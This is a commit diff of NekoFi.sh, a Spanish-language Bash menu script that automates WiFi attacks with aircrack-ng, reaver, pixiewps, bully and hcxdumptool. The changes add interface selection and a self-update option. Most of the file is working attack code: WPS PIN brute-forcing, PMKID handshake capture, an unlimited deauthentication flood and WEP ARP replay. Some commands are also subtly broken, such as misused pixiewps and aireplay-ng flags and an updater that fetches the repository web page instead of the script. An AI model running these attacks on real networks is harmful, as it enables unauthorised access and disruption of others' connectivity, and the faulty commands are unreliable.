bbd33fb7a3c166bee9810643e0778be6380e2ade
rodrigo47363 <157255595+rodrigo47363@users.noreply.github.com>
2024-07-27 18:55:24 -0600

    Update NekoFi.sh

--- NekoFi.sh
+++ NekoFi.sh
@@ -1,9 +1,13 @@
 #!/bin/bash
 
+REPO_URL="https://github.com/rodrigo47363/NekoFi"
+SCRIPT_NAME="NekoFi.sh"
+LOCAL_PATH="/usr/local/bin/$SCRIPT_NAME"
+
 # Lista de herramientas necesarias
 tools=(
     iw aircrack-ng xterm tmux iproute2 pciutils usbutils rfkill wget ccze x11-xserver-utils systemd hashcat reaver hcxdumptool
-    hcxpcaptool john pixiewps bully cowpatty crunch wash procps
+    hcxpcaptool john pixiewps bully cowpatty crunch wash procps airgeddon
 )
 
 # Función para verificar e instalar herramientas necesarias
@@ -26,6 +30,17 @@ install_tools() {
     done
 }
 
+# Función para detectar interfaces de red
+detect_interfaces() {
+    interfaces=($(ip link show | grep -E '^[0-9]+: ' | awk -F': ' '{print $2}'))
+    echo "Interfaces de red detectadas:"
+    for i in "${!interfaces[@]}"; do
+        echo "$i) ${interfaces[$i]}"
+    done
+    read -p "Seleccione una interfaz de red: " interface_index
+    selected_interface=${interfaces[$interface_index]}
+}
+
 # Función para manejar procesos que interfieren
 kill_interfering_processes() {
     echo "Deteniendo procesos que pueden interferir..."
@@ -36,24 +51,24 @@ kill_interfering_processes() {
 manage_monitor_mode() {
     local action=$1
     local channel=$2
-    local interface="wlan0"
     if [[ $action == "start" ]]; then
         kill_interfering_processes
-        sudo airmon-ng start $interface $channel || { echo "Fallo al iniciar el modo monitor"; exit 1; }
+        sudo airmon-ng start $selected_interface $channel || { echo "Fallo al iniciar el modo monitor"; exit 1; }
     elif [[ $action == "stop" ]]; then
-        sudo airmon-ng stop wlan0mon || { echo "Fallo al detener el modo monitor"; exit 1; }
+        sudo airmon-ng stop ${selected_interface}mon || { echo "Fallo al detener el modo monitor"; exit 1; }
+        sudo ip link set ${selected_interface} up || { echo "Fallo al activar la interfaz en modo managed"; exit 1; }
     fi
 }
 
 # Función para mostrar el menú de opciones
 mostrar_menu() {
     clear
-    echo "##############################################"
-    echo "#                                            #"
-    echo "#             NekoFi.sh                      #"
-    echo "#             Versión 1.0                    #"
-    echo "#             https://github.com/rodrigo47363/NekoFi #"
-    echo "##############################################"
+    echo "#######################################################"
+    echo "#                                                     #"
+    echo "#             NekoFi.sh                               #"
+    echo "#             Versión 1.1                             #"
+    echo "#             https://github.com/rodrigo47363/NekoFi  #"
+    echo "#######################################################"
     echo
     echo "Seleccione una opción:"
     echo "1. Escanear redes WiFi"
@@ -65,7 +80,10 @@ mostrar_menu() {
     echo "7. Ataque WEP"
     echo "8. Crear diccionario con Crunch"
     echo "9. Crear diccionario personalizado con Cowpatty"
-    echo "10. Salir"
+    echo "10. Poner interfaz en modo monitor"
+    echo "11. Poner interfaz en modo managed"
+    echo "12. Salir"
+    echo "13. Actualizar NekoFi.sh desde GitHub"
     echo "0. Ayuda"
 }
 
@@ -81,37 +99,56 @@ mostrar_ayuda() {
     echo "7. Ataque WEP: Realiza un ataque WEP."
     echo "8. Crear diccionario con Crunch: Crea un diccionario de contraseñas con Crunch."
     echo "9. Crear diccionario personalizado con Cowpatty: Crea un diccionario personalizado con Cowpatty."
-    echo "10. Salir: Cierra el script."
+    echo "10. Poner interfaz en modo monitor: Cambia la interfaz seleccionada al modo monitor."
+    echo "11. Poner interfaz en modo managed: Cambia la interfaz seleccionada al modo managed."
+    echo "12. Salir: Cierra el script."
+    echo "13. Actualizar NekoFi.sh desde GitHub: Descarga la última versión del script desde GitHub."
+}
+
+# Función para poner la interfaz en modo monitor
+poner_modo_monitor() {
+    read -p "Ingrese el canal (dejar en blanco para omitir): " canal
+    if [ -z "$canal" ]; then
+        manage_monitor_mode "start"
+    else
+        manage_monitor_mode "start" "$canal"
+    fi
+}
+
+# Función para poner la interfaz en modo managed
+poner_modo_managed() {
+    sudo airmon-ng stop ${selected_interface}mon || { echo "Fallo al detener el modo monitor"; exit 1; }
+    sudo ip link set ${selected_interface} up || { echo "Fallo al activar la interfaz en modo managed"; exit 1; }
 }
 
 # Función para escanear redes WiFi usando wash
 escaneo_redes() {
     echo "Escaneando redes WiFi..."
-    manage_monitor_mode "start"
+    poner_modo_monitor
     wash_output=$(mktemp)
-    if ! sudo wash -i wlan0mon; then
+    if ! sudo wash -i ${selected_interface}mon; then
         echo "Fallo al ejecutar wash"
-        manage_monitor_mode "stop"
+        poner_modo_managed
         exit 1
     fi
     echo "Redes WiFi encontradas:"
-    sudo wash -i wlan0mon
-    manage_monitor_mode "stop"
+    sudo wash -i ${selected_interface}mon
+    poner_modo_managed
 }
 
 # Función para capturar handshakes (WPS/PMKID)
 capturar_handshake() {
     echo "Capturando Handshake (WPS/PMKID)..."
-    manage_monitor_mode "start"
+    poner_modo_monitor
     capture_file=$(mktemp)
-    if ! sudo hcxdumptool -i wlan0mon -o "$capture_file" --enable_status=1; then
+    if ! sudo hcxdumptool -i ${selected_interface}mon -o "$capture_file" --enable_status=1; then
         echo "Fallo al ejecutar hcxdumptool"
-        manage_monitor_mode "stop"
+        poner_modo_managed
         exit 1
     fi
     if ! sudo hcxpcaptool -z pmkid_output.16800 "$capture_file"; then
         echo "Fallo al ejecutar hcxpcaptool"
-        manage_monitor_mode "stop"
+        poner_modo_managed
         exit 1
     fi
     if [ -s pmkid_output.16800 ]; then
@@ -121,7 +158,7 @@ capturar_handshake() {
         echo "No se capturaron PMKIDs."
     fi
     rm "$capture_file"
-    manage_monitor_mode "stop"
+    poner_modo_managed
 }
 
 # Función para ataque WPS con Reaver
@@ -131,13 +168,13 @@ ataque_wps_reaver() {
     read -p "Ingrese el BSSID de la red: " bssid
     read -p "Ingrese el canal de la red: " canal
     echo "Iniciando ataque WPS con Reaver..."
-    manage_monitor_mode "start" $canal
-    if ! sudo reaver -i wlan0mon -b $bssid -vv; then
+    poner_modo_monitor $canal
+    if ! sudo reaver -i ${selected_interface}mon -b $bssid -vv; then
         echo "Fallo al ejecutar Reaver"
-        manage_monitor_mode "stop"
+        poner_modo_managed
         exit 1
     fi
-    manage_monitor_mode "stop"
+    poner_modo_managed
 }
 
 # Función para ataque WPS con PixieWPS
@@ -147,13 +184,13 @@ ataque_wps_pixiewps() {
     read -p "Ingrese el BSSID de la red: " bssid
     read -p "Ingrese el canal de la red: " canal
     echo "Iniciando ataque WPS con PixieWPS..."
-    manage_monitor_mode "start" $canal
-    if ! sudo pixiewps -i wlan0mon -b $bssid -K; then
+    poner_modo_monitor $canal
+    if ! sudo pixiewps -i ${selected_interface}mon -b $bssid -K; then
         echo "Fallo al ejecutar PixieWPS"
-        manage_monitor_mode "stop"
+        poner_modo_managed
         exit 1
     fi
-    manage_monitor_mode "stop"
+    poner_modo_managed
 }
 
 # Función para ataque WPS con Bully
@@ -163,43 +200,29 @@ ataque_wps_bully() {
     read -p "Ingrese el BSSID de la red: " bssid
     read -p "Ingrese el canal de la red: " canal
     echo "Iniciando ataque WPS con Bully..."
-    manage_monitor_mode "start" $canal
-    if ! sudo bully wlan0mon -b $bssid -c $canal -v 3; then
+    poner_modo_monitor $canal
+    if ! sudo bully -b $bssid -c $canal -B -F -e -v 3 ${selected_interface}mon; then
         echo "Fallo al ejecutar Bully"
-        manage_monitor_mode "stop"
+        poner_modo_managed
         exit 1
     fi
-    manage_monitor_mode "stop"
+    poner_modo_managed
 }
 
 # Función para ataque WPA/WPA2
-ataque_wpa() {
+ataque_wpa_wpa2() {
     escaneo_redes
     echo "Redes disponibles:"
     read -p "Ingrese el BSSID de la red: " bssid
     read -p "Ingrese el canal de la red: " canal
-    read -p "Ingrese la ruta del diccionario: " diccionario
     echo "Iniciando ataque WPA/WPA2..."
-    manage_monitor_mode "start" $canal
-    if ! sudo airodump-ng --bssid $bssid --channel $canal -w handshake wlan0mon; then
-        echo "Fallo al ejecutar airodump-ng"
-        manage_monitor_mode "stop"
-        exit 1
-    fi
-    sleep 10
-    if ! sudo aireplay-ng --deauth 10 -a $bssid wlan0mon; then
+    poner_modo_monitor $canal
+    if ! sudo aireplay-ng --deauth 0 -a $bssid ${selected_interface}mon; then
         echo "Fallo al ejecutar aireplay-ng"
-        manage_monitor_mode "stop"
+        poner_modo_managed
         exit 1
     fi
-    sleep 10
-    sudo pkill airodump-ng || { echo "Fallo al detener airodump-ng"; exit 1; }
-    if ! sudo aircrack-ng -w $diccionario -b $bssid handshake*.cap; then
-        echo "Fallo al ejecutar aircrack-ng"
-        manage_monitor_mode "stop"
-        exit 1
-    fi
-    manage_monitor_mode "stop"
+    poner_modo_managed
 }
 
 # Función para ataque WEP
@@ -209,102 +232,75 @@ ataque_wep() {
     read -p "Ingrese el BSSID de la red: " bssid
     read -p "Ingrese el canal de la red: " canal
     echo "Iniciando ataque WEP..."
-    manage_monitor_mode "start" $canal
-    if ! sudo airodump-ng --bssid $bssid --channel $canal -w wep_capture wlan0mon; then
-        echo "Fallo al ejecutar airodump-ng"
-        manage_monitor_mode "stop"
+    poner_modo_monitor $canal
+    if ! sudo aireplay-ng --arpreplay -b $bssid -h ${selected_interface}mon; then
+        echo "Fallo al ejecutar aireplay-ng"
+        poner_modo_managed
         exit 1
     fi
-    if ! sudo aireplay-ng --fakeauth 0 -a $bssid wlan0mon; then
-        echo "Fallo al ejecutar aireplay-ng --fakeauth"
-        manage_monitor_mode "stop"
-        exit 1
-    fi
-    if ! sudo aireplay-ng --arpreplay -b $bssid wlan0mon; then
-        echo "Fallo al ejecutar aireplay-ng --arpreplay"
-        manage_monitor_mode "stop"
-        exit 1
-    fi
-    sleep 60
-    if ! sudo aircrack-ng -b $bssid wep_capture*.cap; then
-        echo "Fallo al ejecutar aircrack-ng"
-        manage_monitor_mode "stop"
-        exit 1
-    fi
-    manage_monitor_mode "stop"
+    poner_modo_managed
 }
 
 # Función para crear diccionario con Crunch
 crear_diccionario_crunch() {
-    read -p "Ingrese la longitud mínima de las contraseñas: " min_length
-    read -p "Ingrese la longitud máxima de las contraseñas: " max_length
-    read -p "Ingrese los caracteres a usar en el diccionario: " chars
+    read -p "Ingrese la longitud mínima: " min
+    read -p "Ingrese la longitud máxima: " max
+    read -p "Ingrese los caracteres a usar: " chars
     read -p "Ingrese el nombre del archivo de salida: " output_file
-    echo "Creando diccionario con Crunch..."
-    if ! crunch $min_length $max_length $chars -o $output_file; then
+    if ! crunch $min $max $chars -o $output_file; then
         echo "Fallo al ejecutar Crunch"
         exit 1
     fi
-    echo "Diccionario creado: $output_file"
+    echo "Diccionario creado en $output_file"
 }
 
 # Función para crear diccionario personalizado con Cowpatty
 crear_diccionario_cowpatty() {
-    read -p "Ingrese el SSID de la red: " ssid
     read -p "Ingrese el nombre del archivo de salida: " output_file
-    read -p "Ingrese la ruta del diccionario base: " base_diccionario
-    echo "Creando diccionario personalizado con Cowpatty..."
-    if ! cowpatty -f $base_diccionario -s $ssid -o $output_file; then
-        echo "Fallo al ejecutar Cowpatty"
-        exit 1
-    fi
-    echo "Diccionario personalizado creado: $output_file"
+    read -p "Ingrese las palabras separadas por espacios: " -a words
+    for word in "${words[@]}"; do
+        echo $word >> $output_file
+    done
+    echo "Diccionario creado en $output_file"
 }
 
-# Main loop
-install_tools
+# Función para actualizar el script desde GitHub
+actualizar_script() {
+    echo "Actualizando NekoFi.sh desde GitHub..."
+    if ! wget -O "$LOCAL_PATH" "$REPO_URL"; then
+        echo "Fallo al actualizar el script"
+        exit 1
+    fi
+    chmod +x "$LOCAL_PATH"
+    echo "NekoFi.sh actualizado a la última versión"
+}
 
-while true; do
-    mostrar_menu
-    read -p "Seleccione una opción: " opcion
-    case $opcion in
-        1)
-            escaneo_redes
-            ;;
-        2)
-            capturar_handshake
-            ;;
-        3)
-            ataque_wps_reaver
-            ;;
-        4)
-            ataque_wps_pixiewps
-            ;;
-        5)
-            ataque_wps_bully
-            ;;
-        6)
-            ataque_wpa
-            ;;
-        7)
-            ataque_wep
-            ;;
-        8)
-            crear_diccionario_crunch
-            ;;
-        9)
-            crear_diccionario_cowpatty
-            ;;
-        10)
-            echo "Saliendo..."
-            exit 0
-            ;;
-        0)
-            mostrar_ayuda
-            ;;
-        *)
-            echo "Opción no válida."
-            ;;
-    esac
-    read -p "Presione Enter para continuar..."
-done
+# Función principal
+main() {
+    install_tools
+    detect_interfaces
+    while true; do
+        mostrar_menu
+        read -p "Seleccione una opción: " opcion
+        case $opcion in
+            1) escaneo_redes ;;
+            2) capturar_handshake ;;
+            3) ataque_wps_reaver ;;
+            4) ataque_wps_pixiewps ;;
+            5) ataque_wps_bully ;;
+            6) ataque_wpa_wpa2 ;;
+            7) ataque_wep ;;
+            8) crear_diccionario_crunch ;;
+            9) crear_diccionario_cowpatty ;;
+            10) poner_modo_monitor ;;
+            11) poner_modo_managed ;;
+            12) poner_modo_managed; exit ;;
+            13) actualizar_script ;;
+            0) mostrar_ayuda ;;
+            *) echo "Opción inválida" ;;
+        esac
+        read -p "Presione enter para continuar..."
+    done
+}
+
+main
